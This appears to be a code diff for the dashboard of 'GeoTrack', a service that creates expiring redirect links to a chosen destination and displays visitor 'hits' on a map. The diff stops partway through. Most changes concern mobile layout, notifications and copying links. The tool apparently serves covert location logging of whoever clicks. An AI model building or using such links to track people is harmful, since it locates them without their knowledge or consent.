@@ -2,121 +2,201 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
 <title>GeoTrack — Dashboard</title>
 <link href="https://fonts.googleapis.com/css2?family=Space+Mono:wght@400;700&family=Syne:wght@400;700;800&display=swap" rel="stylesheet">
 <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>
 <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
 <style>
-:root{--bg:#080b10;--s:#0d1117;--border:#1a2030;--accent:#00ff88;--red:#ff3a5c;--text:#e2e8f0;--muted:#4a5568;--card:#0d1117;--accent2:#0095ff}
-*{margin:0;padding:0;box-sizing:border-box}
-html,body{height:100%}
+:root{
+  --bg:#080b10;--s:#0d1117;--border:#1a2030;
+  --accent:#00ff88;--red:#ff3a5c;--text:#e2e8f0;
+  --muted:#4a5568;--card:#0d1117;--accent2:#0095ff;
+  --nav-h:54px;--mob-bar:56px;
+}
+*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+html,body{height:100%;overflow:hidden}
 body{background:var(--bg);color:var(--text);font-family:'Syne',sans-serif;display:flex;flex-direction:column}
 
-/* TOPNAV */
-.topnav{background:var(--s);border-bottom:1px solid var(--border);padding:0 1.5rem;height:54px;display:flex;align-items:center;justify-content:space-between;flex-shrink:0}
-.nav-logo{font-size:1.1rem;font-weight:800;letter-spacing:-0.03em}
+/* ── TOPNAV ── */
+.topnav{background:var(--s);border-bottom:1px solid var(--border);padding:0 1rem;height:var(--nav-h);display:flex;align-items:center;justify-content:space-between;flex-shrink:0;z-index:50}
+.nav-logo{font-size:1.05rem;font-weight:800;letter-spacing:-0.03em;white-space:nowrap}
 .nav-logo span{color:var(--accent)}
-.nav-right{display:flex;align-items:center;gap:1rem}
-.nav-user{font-family:'Space Mono',monospace;font-size:0.72rem;color:var(--muted)}
+.nav-right{display:flex;align-items:center;gap:.6rem;flex-shrink:0}
+.nav-user{font-family:'Space Mono',monospace;font-size:0.68rem;color:var(--muted);white-space:nowrap;overflow:hidden;text-overflow:ellipsis;max-width:130px}
 .nav-user strong{color:var(--text)}
-.btn-logout{background:transparent;border:1px solid var(--border);color:var(--muted);font-family:'Space Mono',monospace;font-size:0.7rem;padding:5px 12px;border-radius:3px;cursor:pointer;transition:border-color .2s,color .2s}
-.btn-logout:hover{border-color:var(--red);color:var(--red)}
+.btn-nav{font-family:'Space Mono',monospace;font-size:0.68rem;padding:5px 10px;border-radius:3px;cursor:pointer;white-space:nowrap;border:1px solid var(--border);background:transparent;color:var(--muted);transition:border-color .2s,color .2s,background .2s;text-decoration:none;display:inline-flex;align-items:center;gap:5px}
+.btn-nav:hover{border-color:var(--red);color:var(--red)}
+.btn-nav.donate{background:rgba(0,255,136,0.08);border-color:rgba(0,255,136,0.25);color:var(--accent)}
+.btn-nav.donate:hover{background:rgba(0,255,136,0.15);border-color:var(--accent)}
 
-/* LAYOUT */
-.layout{display:flex;flex:1;overflow:hidden}
+/* ── LAYOUT ── */
+.layout{display:flex;flex:1;overflow:hidden;height:calc(100vh - var(--nav-h))}
 
-/* SIDEBAR */
-.sidebar{width:320px;flex-shrink:0;border-right:1px solid var(--border);display:flex;flex-direction:column;overflow:hidden}
-.sidebar-header{padding:1.25rem 1.25rem .75rem;border-bottom:1px solid var(--border);flex-shrink:0}
-.sidebar-title{font-family:'Space Mono',monospace;font-size:0.65rem;color:var(--muted);text-transform:uppercase;letter-spacing:0.12em;margin-bottom:.75rem}
+/* ── SIDEBAR ── */
+.sidebar{width:300px;flex-shrink:0;border-right:1px solid var(--border);display:flex;flex-direction:column;overflow:hidden}
+.sidebar-header{padding:.9rem;border-bottom:1px solid var(--border);flex-shrink:0}
+.sidebar-title{font-family:'Space Mono',monospace;font-size:0.6rem;color:var(--muted);text-transform:uppercase;letter-spacing:0.12em;margin-bottom:.6rem}
 
-/* Generator */
-.gen-box{background:var(--bg);border:1px solid var(--border);border-radius:6px;padding:1rem}
-.field{display:flex;flex-direction:column;gap:5px;margin-bottom:.75rem}
+.gen-box{background:var(--bg);border:1px solid var(--border);border-radius:6px;padding:.8rem}
+.field{display:flex;flex-direction:column;gap:4px;margin-bottom:.6rem}
 .field:last-of-type{margin-bottom:0}
-label{font-family:'Space Mono',monospace;font-size:0.62rem;color:var(--muted);text-transform:uppercase;letter-spacing:0.1em}
-input,select{background:#060a0f;border:1px solid var(--border);color:var(--text);font-family:'Space Mono',monospace;font-size:0.82rem;padding:.6rem .8rem;border-radius:4px;outline:none;transition:border-color .2s;width:100%}
+label{font-family:'Space Mono',monospace;font-size:0.58rem;color:var(--muted);text-transform:uppercase;letter-spacing:0.1em}
+input,select{background:#060a0f;border:1px solid var(--border);color:var(--text);font-family:'Space Mono',monospace;font-size:0.82rem;padding:.56rem .75rem;border-radius:4px;outline:none;transition:border-color .2s;width:100%;-webkit-appearance:none;appearance:none}
 input:focus,select:focus{border-color:var(--accent)}
 input::placeholder{color:var(--muted)}
 select option{background:#060a0f}
 
-.btn-gen{width:100%;background:var(--accent);color:#000;border:none;font-family:'Space Mono',monospace;font-size:0.75rem;font-weight:700;padding:.65rem;border-radius:4px;cursor:pointer;text-transform:uppercase;letter-spacing:0.07em;transition:background .15s;margin-top:.75rem}
+.btn-gen{width:100%;background:var(--accent);color:#000;border:none;font-family:'Space Mono',monospace;font-size:0.73rem;font-weight:700;padding:.62rem;border-radius:4px;cursor:pointer;text-transform:uppercase;letter-spacing:0.07em;transition:background .15s;margin-top:.6rem}
 .btn-gen:hover{background:#00e87a}
+.btn-gen:active{background:#00cc6a}
 .btn-gen:disabled{opacity:.5;cursor:not-allowed}
 
-.gen-result{display:none;margin-top:.75rem;padding:.75rem;background:rgba(0,255,136,0.04);border:1px solid rgba(0,255,136,0.2);border-radius:4px}
+.gen-result{display:none;margin-top:.6rem;padding:.6rem;background:rgba(0,255,136,0.04);border:1px solid rgba(0,255,136,0.2);border-radius:4px}
 .gen-result.show{display:block}
-.gen-link{font-family:'Space Mono',monospace;font-size:0.72rem;color:var(--accent);word-break:break-all;line-height:1.5;margin-bottom:.5rem}
-.btn-copy{background:transparent;border:1px solid rgba(0,255,136,0.3);color:var(--accent);font-family:'Space Mono',monospace;font-size:0.68rem;padding:4px 10px;border-radius:3px;cursor:pointer;transition:background .15s}
-.btn-copy:hover{background:rgba(0,255,136,0.1)}
+.gen-link-wrap{display:flex;align-items:center;gap:.4rem;margin-bottom:.45rem}
+.gen-link{font-family:'Space Mono',monospace;font-size:0.63rem;color:var(--accent);word-break:break-all;line-height:1.5;flex:1}
+.gen-link{font-family:'Space Mono',monospace;font-size:0.65rem;color:var(--accent);word-break:break-all;line-height:1.5;margin-bottom:.4rem}
+.btn-copy{background:transparent;border:1px solid rgba(0,255,136,0.25);color:var(--accent);font-family:'Space Mono',monospace;font-size:0.63rem;padding:4px 9px;border-radius:3px;cursor:pointer;transition:background .15s,border-color .15s}
+.btn-copy:hover{background:rgba(0,255,136,0.08)}
+.btn-copy.copied{border-color:var(--accent);background:rgba(0,255,136,0.12)}
 
-/* Links list */
-.links-list{flex:1;overflow-y:auto;padding:.75rem}
-.links-list::-webkit-scrollbar{width:4px}
-.links-list::-webkit-scrollbar-track{background:transparent}
+.links-list{flex:1;overflow-y:auto;padding:.6rem}
+.links-list::-webkit-scrollbar{width:3px}
 .links-list::-webkit-scrollbar-thumb{background:var(--border);border-radius:2px}
 
-.link-card{background:var(--bg);border:1px solid var(--border);border-radius:6px;padding:.85rem 1rem;margin-bottom:.6rem;cursor:pointer;transition:border-color .2s}
-.link-card:hover{border-color:rgba(0,255,136,0.3)}
+.link-card{background:var(--bg);border:1px solid var(--border);border-radius:6px;padding:.7rem .85rem;margin-bottom:.45rem;cursor:pointer;transition:border-color .2s,transform .15s}
+.link-card:hover{border-color:rgba(0,255,136,0.3);transform:translateX(2px)}
+.link-card:active{transform:translateX(0)}
 .link-card.active{border-color:var(--accent)}
-.lc-dest{font-size:.88rem;font-weight:700;margin-bottom:.35rem;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
-.lc-meta{display:flex;align-items:center;gap:.5rem;flex-wrap:wrap}
-.lc-badge{font-family:'Space Mono',monospace;font-size:0.62rem;padding:2px 7px;border-radius:2px;border:1px solid}
+.lc-dest{font-size:.84rem;font-weight:700;margin-bottom:.28rem;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.lc-meta{display:flex;align-items:center;gap:.35rem;flex-wrap:wrap}
+.lc-badge{font-family:'Space Mono',monospace;font-size:0.57rem;padding:2px 6px;border-radius:2px;border:1px solid;white-space:nowrap}
 .lc-badge.hits{background:rgba(0,255,136,0.08);border-color:rgba(0,255,136,0.2);color:var(--accent)}
 .lc-badge.exp{background:rgba(255,58,92,0.08);border-color:rgba(255,58,92,0.2);color:var(--red)}
 .lc-badge.live{background:rgba(0,149,255,0.08);border-color:rgba(0,149,255,0.2);color:var(--accent2)}
-.lc-time{font-family:'Space Mono',monospace;font-size:0.6rem;color:var(--muted)}
-.lc-del{margin-left:auto;background:transparent;border:none;color:var(--muted);font-size:.8rem;cursor:pointer;padding:2px 5px;transition:color .2s}
-.lc-del:hover{color:var(--red)}
+.lc-time{font-family:'Space Mono',monospace;font-size:0.57rem;color:var(--muted)}
+.lc-del{margin-left:auto;background:transparent;border:none;color:var(--muted);font-size:.75rem;cursor:pointer;padding:4px 6px;border-radius:3px;transition:color .2s,background .2s;flex-shrink:0}
+.lc-del:hover{color:var(--red);background:rgba(255,58,92,0.08)}
+.empty{font-family:'Space Mono',monospace;font-size:.7rem;color:var(--muted);text-align:center;padding:1.5rem 1rem;border:1px dashed var(--border);border-radius:6px;line-height:1.7}
 
-.empty{font-family:'Space Mono',monospace;font-size:.75rem;color:var(--muted);text-align:center;padding:2rem;border:1px dashed var(--border);border-radius:6px}
+/* ── TOAST ── */
+.toast-wrap{position:fixed;bottom:72px;left:50%;transform:translateX(-50%);z-index:999;display:flex;flex-direction:column;gap:8px;align-items:center;pointer-events:none}
+.toast{font-family:'Space Mono',monospace;font-size:0.72rem;padding:8px 16px;border-radius:4px;border:1px solid;animation:toastIn .25s ease both;white-space:nowrap}
+.toast.success{background:rgba(0,255,136,0.1);border-color:rgba(0,255,136,0.3);color:var(--accent)}
+.toast.error{background:rgba(255,58,92,0.1);border-color:rgba(255,58,92,0.3);color:var(--red)}
+@keyframes toastIn{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:translateY(0)}}
 
-/* MAIN */
-.main{flex:1;display:flex;flex-direction:column;overflow:hidden}
-
-.main-header{padding:1.25rem 1.5rem;border-bottom:1px solid var(--border);flex-shrink:0;display:flex;align-items:center;justify-content:space-between}
-.main-title{font-size:1.1rem;font-weight:700}
-.main-sub{font-family:'Space Mono',monospace;font-size:.68rem;color:var(--muted);margin-top:2px}
-.live-badge{display:flex;align-items:center;gap:5px;font-family:'Space Mono',monospace;font-size:.65rem;color:var(--accent)}
-.live-dot{width:6px;height:6px;background:var(--accent);border-radius:50%;animation:blink 1.2s infinite}
+/* ── MAIN ── */
+.main{flex:1;display:flex;flex-direction:column;overflow:hidden;min-width:0}
+.main-header{padding:.9rem 1.1rem;border-bottom:1px solid var(--border);flex-shrink:0;display:flex;align-items:center;justify-content:space-between;gap:.5rem}
+.main-title{font-size:.95rem;font-weight:700;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.main-sub{font-family:'Space Mono',monospace;font-size:.6rem;color:var(--muted);margin-top:2px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.live-badge{display:flex;align-items:center;gap:5px;font-family:'Space Mono',monospace;font-size:.6rem;color:var(--accent);flex-shrink:0}
+.live-dot{width:6px;height:6px;background:var(--accent);border-radius:50%;animation:blink 1.2s infinite;flex-shrink:0}
 @keyframes blink{0%,100%{opacity:1}50%{opacity:.2}}
 
-.main-body{flex:1;overflow-y:auto;padding:1.25rem 1.5rem}
-.main-body::-webkit-scrollbar{width:4px}
+.main-body{flex:1;overflow-y:auto;padding:1rem 1.1rem;-webkit-overflow-scrolling:touch}
+.main-body::-webkit-scrollbar{width:3px}
 .main-body::-webkit-scrollbar-thumb{background:var(--border);border-radius:2px}
 
-/* no link selected */
-.no-select{display:flex;flex-direction:column;align-items:center;justify-content:center;height:100%;gap:1rem;color:var(--muted)}
-.no-select .icon{font-size:3rem;opacity:.3}
-.no-select p{font-family:'Space Mono',monospace;font-size:.75rem;text-align:center;line-height:1.6}
+.no-select{display:flex;flex-direction:column;align-items:center;justify-content:center;height:100%;gap:1rem;color:var(--muted);text-align:center}
+.no-select .icon{font-size:2.5rem;opacity:.25}
+.no-select p{font-family:'Space Mono',monospace;font-size:.7rem;line-height:1.65}
 
 /* hits */
-.hits-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(300px,1fr));gap:1rem;margin-bottom:1.5rem}
-.hit-card{background:var(--s);border:1px solid var(--border);border-radius:8px;padding:1rem 1.1rem}
-.hit-num{font-family:'Space Mono',monospace;font-size:.6rem;color:var(--muted);text-transform:uppercase;letter-spacing:.1em;margin-bottom:.6rem}
-.hit-row{display:flex;justify-content:space-between;align-items:center;padding:.35rem 0;border-bottom:1px solid rgba(255,255,255,0.04)}
-.hit-row:last-child{border-bottom:none}
-.hk{font-family:'Space Mono',monospace;font-size:.62rem;color:var(--muted);text-transform:uppercase;letter-spacing:.07em}
-.hv{font-family:'Space Mono',monospace;font-size:.78rem;color:var(--text)}
+.hits-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(240px,1fr));gap:.8rem;margin-bottom:1.1rem}
+.hit-card{background:var(--s);border:1px solid var(--border);border-radius:8px;padding:.85rem .95rem;animation:fadeUp .3s ease both}
+@keyframes fadeUp{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:translateY(0)}}
+.hit-num{font-family:'Space Mono',monospace;font-size:.57rem;color:var(--muted);text-transform:uppercase;letter-spacing:.1em;margin-bottom:.5rem}
+.hit-row{display:flex;justify-content:space-between;align-items:center;padding:.28rem 0;border-bottom:1px solid rgba(255,255,255,0.04)}
+.hit-row:last-of-type{border-bottom:none}
+.hk{font-family:'Space Mono',monospace;font-size:.57rem;color:var(--muted);text-transform:uppercase;letter-spacing:.06em}
+.hv{font-family:'Space Mono',monospace;font-size:.73rem;color:var(--text);text-align:right;max-width:55%;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
 .hv.green{color:var(--accent)}
 .hv.blue{color:var(--accent2)}
-.map-link{display:inline-block;margin-top:.6rem;font-family:'Space Mono',monospace;font-size:.65rem;color:var(--accent);text-decoration:none;border:1px solid rgba(0,255,136,0.2);padding:3px 9px;border-radius:3px;transition:background .15s}
+.map-link{display:inline-flex;align-items:center;gap:5px;margin-top:.5rem;font-family:'Space Mono',monospace;font-size:.6rem;color:var(--accent);text-decoration:none;border:1px solid rgba(0,255,136,0.2);padding:4px 10px;border-radius:3px;transition:background .15s}
 .map-link:hover{background:rgba(0,255,136,0.08)}
 
-/* map */
-.map-wrap{height:300px;border:1px solid var(--border);border-radius:8px;overflow:hidden;margin-bottom:1.5rem}
+.map-wrap{height:260px;border:1px solid var(--border);border-radius:8px;overflow:hidden;margin-bottom:1.1rem}
 #map{height:100%;width:100%;background:#0a0e15}
-.leaflet-tile{filter:brightness(0.7) saturate(0.8)}
 
-.no-hits-msg{text-align:center;padding:3rem;font-family:'Space Mono',monospace;font-size:.78rem;color:var(--muted);border:1px dashed var(--border);border-radius:8px}
+.no-hits-msg{text-align:center;padding:2.5rem 1rem;font-family:'Space Mono',monospace;font-size:.73rem;color:var(--muted);border:1px dashed var(--border);border-radius:8px;line-height:1.7}
+.section-label{font-family:'Space Mono',monospace;font-size:.58rem;color:var(--muted);text-transform:uppercase;letter-spacing:.12em;margin-bottom:.6rem}
 
-.section-label{font-family:'Space Mono',monospace;font-size:.62rem;color:var(--muted);text-transform:uppercase;letter-spacing:.12em;margin-bottom:.75rem}
+.expiry-bar{display:flex;align-items:center;gap:.6rem;padding:.5rem .85rem;border-radius:5px;margin-bottom:1rem;font-family:'Space Mono',monospace;font-size:.66rem;flex-wrap:wrap}
+.expiry-bar.live-bar{background:rgba(0,149,255,0.07);border:1px solid rgba(0,149,255,0.2);color:var(--accent2)}
+.expiry-bar.dead-bar{background:rgba(255,58,92,0.07);border:1px solid rgba(255,58,92,0.2);color:var(--red)}
 
-/* expiry info bar */
-.expiry-bar{display:flex;align-items:center;gap:.75rem;padding:.6rem 1rem;border-radius:5px;margin-bottom:1.25rem;font-family:'Space Mono',monospace;font-size:.72rem}
-.expiry-bar.live{background:rgba(0,149,255,0.07);border:1px solid rgba(0,149,255,0.2);color:var(--accent2)}
-.expiry-bar.dead{background:rgba(255,58,92,0.07);border:1px solid rgba(255,58,92,0.2);color:var(--red)}
+/* ── MOBILE BOTTOM NAV ── */
+.mob-bottom{display:none;position:fixed;bottom:0;left:0;right:0;height:var(--mob-bar);background:var(--s);border-top:1px solid var(--border);z-index:100;flex-direction:row}
+.mob-tab{flex:1;padding:.6rem .5rem .5rem;text-align:center;font-family:'Space Mono',monospace;font-size:.58rem;color:var(--muted);cursor:pointer;transition:color .2s;border:none;background:transparent;display:flex;flex-direction:column;align-items:center;gap:3px;position:relative}
+.mob-tab.active{color:var(--accent)}
+.mob-tab.active::after{content:'';position:absolute;top:0;left:25%;right:25%;height:2px;background:var(--accent);border-radius:0 0 2px 2px}
+.mob-tab svg{width:19px;height:19px}
+
+/* ── MOBILE: full responsive ── */
+@media(max-width:700px){
+  html,body{overflow:hidden}
+
+  .layout{
+    flex-direction:column;
+    height:calc(100vh - var(--nav-h) - var(--mob-bar));
+    overflow:hidden;
+  }
+
+  /* sidebar fills full height when active */
+  .sidebar{
+    position:absolute;
+    top:var(--nav-h);
+    left:0;right:0;
+    bottom:var(--mob-bar);
+    width:100%;
+    border-right:none;
+    border-bottom:none;
+    display:none;
+    z-index:40;
+    background:var(--bg);
+  }
+  .sidebar.mob-active{display:flex}
+
+  /* main fills full height when active */
+  .main{
+    position:absolute;
+    top:var(--nav-h);
+    left:0;right:0;
+    bottom:var(--mob-bar);
+    width:100%;
+    display:none;
+    z-index:40;
+  }
+  .main.mob-active{display:flex}
+
+  .mob-bottom{display:flex}
+
+  /* tighter mobile padding */
+  .main-body{padding:.75rem}
+  .main-header{padding:.75rem .85rem}
+  .sidebar-header{padding:.75rem}
+
+  .hits-grid{grid-template-columns:1fr;gap:.65rem}
+  .map-wrap{height:200px}
+
+  /* hide user greeting on very small screens */
+  .nav-user{display:none}
+
+  /* bigger touch targets */
+  .link-card{padding:.85rem .9rem;margin-bottom:.5rem}
+  .lc-del{padding:6px 8px;font-size:.82rem}
+
+  /* toast above bottom nav */
+  .toast-wrap{bottom:calc(var(--mob-bar) + 10px)}
+}
+
+@media(max-width:380px){
+  .btn-nav.donate span{display:none}
+  .nav-logo{font-size:.95rem}
+}
 </style>
 </head>
 <body>
@@ -124,18 +204,22 @@ select option{background:#060a0f}
 <nav class="topnav">
   <div class="nav-logo">Geo<span>Track</span></div>
   <div class="nav-right">
-    <span class="nav-user">Hello, <strong id="navName">…</strong></span>
-    <button class="btn-logout" onclick="logout()">Logout</button>
+    <span class="nav-user">Hi, <strong id="navName">…</strong></span>
+    <a href="/donate" class="btn-nav donate">❤️ <span>Donate</span></a>
+    <button class="btn-nav" onclick="logout()">Logout</button>
   </div>
 </nav>
 
 <div class="layout">
   <!-- SIDEBAR -->
-  <aside class="sidebar">
+  <aside class="sidebar" id="sidebarPanel">
     <div class="sidebar-header">
       <div class="sidebar-title">Generate New Link</div>
       <div class="gen-box">
-        <div class="field"><label>Destination URL</label><input type="text" id="destUrl" placeholder="https://google.com"></div>
+        <div class="field">
+          <label>Destination URL</label>
+          <input type="url" id="destUrl" placeholder="https://google.com" inputmode="url" autocomplete="off">
+        </div>
         <div class="field">
           <label>Expires In</label>
           <select id="expiresIn">
@@ -149,27 +233,30 @@ select option{background:#060a0f}
         </div>
         <button class="btn-gen" id="genBtn" onclick="generateLink()">⚡ Generate Link</button>
         <div class="gen-result" id="genResult">
-          <div class="gen-link" id="genLink"></div>
-          <button class="btn-copy" onclick="copyGenLink()">Copy Link</button>
+          <div class="gen-link-wrap">
+            <div class="gen-link" id="genLink"></div>
+          </div>
+          <div style="display:flex;gap:.4rem">
+            <button class="btn-copy" id="copyBtn" onclick="copyGenLink()" style="flex:1">Copy Link</button>
+            <button class="btn-copy" onclick="dismissResult()" style="color:var(--muted);border-color:var(--border)">✕</button>
+          </div>
         </div>
       </div>
     </div>
-
     <div class="links-list" id="linksList">
       <div class="empty">No links yet.<br>Generate one above.</div>
     </div>
   </aside>
 
   <!-- MAIN -->
-  <main class="main">
+  <main class="main" id="mainPanel">
     <div class="main-header">
-      <div>
+      <div style="min-width:0;flex:1">
         <div class="main-title" id="mainTitle">Select a link</div>
-        <div class="main-sub" id="mainSub">Click any link from the sidebar to view hits</div>
+        <div class="main-sub" id="mainSub">Choose a link from the sidebar</div>
       </div>
       <div class="live-badge" id="liveBadge" style="display:none"><div class="live-dot"></div>Live</div>
     </div>
-
     <div class="main-body" id="mainBody">
       <div class="no-select">
         <div class="icon">📍</div>
@@ -179,129 +266,249 @@ select option{background:#060a0f}
   </main>
 </div>
 
+<!-- Mobile bottom nav -->
+<div class="mob-bottom" id="mobBottom">
+  <button class="mob-tab active" id="mobGenTab" onclick="mobSwitch('sidebar')">
+    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="12" y1="5" x2="12" y2="19"/><line x1="5" y1="12" x2="19" y2="12"/></svg>
+    Generate
+  </button>
+  <button class="mob-tab" id="mobHitsTab" onclick="mobSwitch('main')">
+    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0118 0z"/><circle cx="12" cy="10" r="3"/></svg>
+    Hits
+  </button>
+</div>
+
+<!-- Toast container -->
+<div class="toast-wrap" id="toastWrap"></div>
+
 <script>
+'use strict';
 let activeLinkId = null;
 let pollTimer = null;
 let mapInstance = null;
-let mapMarkers = [];
+let lastGeneratedUrl = '';   // persists across loadLinks() re-renders
+const isMobile = () => window.innerWidth <= 700;
 
-// ── Init ──────────────────────────────────────────────────────────────
+/* ── Toast (replaces alert) ─────────────────────────────────────── */
+function toast(msg, type = 'success', ms = 2800) {
+  const wrap = document.getElementById('toastWrap');
+  const el = document.createElement('div');
+  el.className = `toast ${type}`;
+  el.textContent = msg;
+  wrap.appendChild(el);
+  setTimeout(() => { el.style.opacity='0'; el.style.transition='opacity .3s'; setTimeout(()=>el.remove(),300); }, ms);
+}
+
+/* ── Mobile panel switch ────────────────────────────────────────── */
+function mobSwitch(panel) {
+  document.getElementById('sidebarPanel').classList.toggle('mob-active', panel==='sidebar');
+  document.getElementById('mainPanel').classList.toggle('mob-active', panel==='main');
+  document.getElementById('mobGenTab').classList.toggle('active', panel==='sidebar');
+  document.getElementById('mobHitsTab').classList.toggle('active', panel==='main');
+}
+
+function initMobile() {
+  if (isMobile()) {
+    document.getElementById('sidebarPanel').classList.add('mob-active');
+  }
+}
+
+/* ── Auth check ─────────────────────────────────────────────────── */
 (async () => {
-  const me = await fetch('/api/me').then(r=>r.json());
-  if (!me.loggedIn) return window.location.href = '/';
-  document.getElementById('navName').textContent = me.name;
-  loadLinks();
-  setInterval(loadLinks, 8000);
+  try {
+    const res = await fetch('/api/me', { credentials: 'same-origin' });
+    const ct = res.headers.get('content-type') || '';
+    if (!ct.includes('application/json')) { window.location.href='/'; return; }
+    const me = await res.json();
+    if (!me.loggedIn) { window.location.href='/'; return; }
+    document.getElementById('navName').textContent = me.name;
+    initMobile();
+    loadLinks();
+    setInterval(loadLinks, 8000);
+  } catch(e) { window.location.href='/'; }
 })();
 
 async function logout() {
-  await fetch('/api/logout', { method: 'POST' });
+  try { await fetch('/api/logout', { method:'POST', credentials:'same-origin' }); } catch(e) {}
   window.location.href = '/';
 }
 
-// ── Links list ────────────────────────────────────────────────────────
-async function loadLinks() {
-  const links = await fetch('/api/links').then(r=>r.json()).catch(()=>[]);
-  const el = document.getElementById('linksList');
-  if (!links.length) { el.innerHTML = '<div class="empty">No links yet.<br>Generate one above.</div>'; return; }
+/* ── API helper ─────────────────────────────────────────────────── */
+async function apiFetch(url, opts={}) {
+  opts.credentials = 'same-origin';
+  opts.headers = { ...(opts.headers||{}), 'Content-Type':'application/json' };
+  const res = await fetch(url, opts);
+  const ct = res.headers.get('content-type') || '';
+  if (!ct.includes('application/json')) throw new Error('Bad response');
+  const data = await res.json();
+  if (data.error) throw new Error(data.error);
+  return data;
+}
 
+/* ── Generate link ──────────────────────────────────────────────── */
+async function generateLink() {
+  const dest = document.getElementById('destUrl').value.trim();
+  if (!dest) { toast('Enter a destination URL', 'error'); return; }
+  const expiresIn = document.getElementById('expiresIn').value;
+  const btn = document.getElementById('genBtn');
+  btn.disabled = true; btn.textContent = 'Generating…';
+  try {
+    const data = await apiFetch('/api/links/create', {
+      method:'POST', body:JSON.stringify({ dest, expiresIn })
+    });
+    lastGeneratedUrl = data.trackUrl;
+    showGenResult(lastGeneratedUrl);
+    document.getElementById('destUrl').value = '';
+    toast('Link generated!');
+    loadLinks();
+    selectLink(data.id);
+    if (isMobile()) mobSwitch('main');
+  } catch(e) { toast(e.message || 'Error generating link', 'error'); }
+  btn.disabled = false; btn.textContent = '⚡ Generate Link';
+}
+
+function showGenResult(url) {
+  document.getElementById('genLink').textContent = url;
+  document.getElementById('genResult').classList.add('show');
+  document.getElementById('copyBtn').textContent = 'Copy Link';
+  document.getElementById('copyBtn').classList.remove('copied');
+}
+
+function dismissResult() {
+  lastGeneratedUrl = '';
+  document.getElementById('genResult').classList.remove('show');
+}
+
+function copyGenLink() {
+  const txt = lastGeneratedUrl || document.getElementById('genLink').textContent;
+  const btn = document.getElementById('copyBtn');
+
+  function onCopied() {
+    btn.textContent = '✓ Copied!';
+    btn.classList.add('copied');
+    toast('Link copied to clipboard');
+    setTimeout(() => { btn.textContent = 'Copy Link'; btn.classList.remove('copied'); }, 2500);
+  }
+
+  // Try modern clipboard API first (requires HTTPS)
+  if (navigator.clipboard && window.isSecureContext) {
+    navigator.clipboard.writeText(txt).then(onCopied).catch(() => fallbackCopy(txt, onCopied));
+  } else {
+    fallbackCopy(txt, onCopied);
+  }
+}
+
+function fallbackCopy(txt, onCopied) {
+  // Works on HTTP and all mobile browsers
+  const ta = document.createElement('textarea');
+  ta.value = txt;
+  ta.style.cssText = 'position:fixed;top:0;left:0;width:1px;height:1px;opacity:0;pointer-events:none';
+  document.body.appendChild(ta);
+  ta.focus();
+  ta.select();
+  // iOS needs setSelectionRange
+  ta.setSelectionRange(0, 99999);
+  try {
+    const ok = document.execCommand('copy');
+    if (ok) onCopied();
+    else toast('Copy failed — long-press the link to copy', 'error');
+  } catch(e) {
+    toast('Copy failed — long-press the link to copy', 'error');
+  }
+  document.body.removeChild(ta);
+}
+
+/* ── Load links list ────────────────────────────────────────────── */
+async function loadLinks() {
+  try {
+    const links = await apiFetch('/api/links');
+    renderLinksList(links);
+    // Restore generated link box if it was showing
+    if (lastGeneratedUrl) showGenResult(lastGeneratedUrl);
+  } catch(e) {}
+}
+
+function renderLinksList(links) {
+  const el = document.getElementById('linksList');
+  if (!links.length) {
+    el.innerHTML = '<div class="empty">No links yet.<br>Generate one above.</div>'; return;
+  }
   el.innerHTML = links.map(l => {
     const expired = new Date(l.expiresAt) < new Date();
-    const timeLeft = expired ? 'Expired' : formatExpiry(l.expiresAt);
-    return `
-    <div class="link-card ${l.id===activeLinkId?'active':''}" onclick="selectLink('${l.id}')">
-      <div style="display:flex;align-items:flex-start">
-        <div style="flex:1;overflow:hidden">
-          <div class="lc-dest">${getDomain(l.dest)}</div>
+    return `<div class="link-card${l.id===activeLinkId?' active':''}" onclick="selectLinkMob('${l.id}')">
+      <div style="display:flex;align-items:flex-start;gap:.4rem">
+        <div style="flex:1;min-width:0">
+          <div class="lc-dest">${esc(getDomain(l.dest))}</div>
           <div class="lc-meta">
-            <span class="lc-badge ${expired?'exp':'live'}">${timeLeft}</span>
+            <span class="lc-badge ${expired?'exp':'live'}">${expired?'Expired':formatExpiry(l.expiresAt)}</span>
             <span class="lc-badge hits">${l.hitCount} hit${l.hitCount!==1?'s':''}</span>
           </div>
-          <div class="lc-time" style="margin-top:.35rem">${fmtDate(l.createdAt)}</div>
+          <div class="lc-time" style="margin-top:.28rem">${fmtDate(l.createdAt)}</div>
         </div>
-        <button class="lc-del" onclick="deleteLink(event,'${l.id}')">✕</button>
+        <button class="lc-del" onclick="deleteLink(event,'${l.id}')" title="Delete">✕</button>
       </div>
     </div>`;
   }).join('');
 }
 
-// ── Generate ──────────────────────────────────────────────────────────
-async function generateLink() {
-  const dest = document.getElementById('destUrl').value.trim();
-  if (!dest) return alert('Enter a destination URL');
-  const expiresIn = document.getElementById('expiresIn').value;
-  const btn = document.getElementById('genBtn');
-  btn.disabled = true; btn.textContent = 'Generating…';
-
-  try {
-    const data = await fetch('/api/links/create', {
-      method:'POST', headers:{'Content-Type':'application/json'},
-      body: JSON.stringify({ dest, expiresIn })
-    }).then(r=>r.json());
-
-    if (data.error) throw new Error(data.error);
-    document.getElementById('genLink').textContent = data.trackUrl;
-    document.getElementById('genResult').classList.add('show');
-    loadLinks();
-    selectLink(data.id);
-  } catch(e) { alert(e.message); }
-  btn.disabled = false; btn.textContent = '⚡ Generate Link';
